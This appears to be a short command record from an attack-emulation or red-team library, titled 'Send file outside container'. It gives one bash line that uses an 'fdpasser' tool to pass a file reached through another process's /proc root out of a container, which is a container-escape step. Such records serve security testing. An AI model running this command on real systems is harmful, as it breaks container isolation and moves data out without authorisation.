---
id: 1cbeb261-1aec-47bc-bdbc-a37829ae712f
name: Send file outside container
type: command
executor: bash
data: ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
output: null
created_at: '2023-04-06T03:56:17.213114+00:00'
updated_at: '2023-04-10T20:33:49.352732+00:00'
---

# Send file outside container

```bash
./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
```


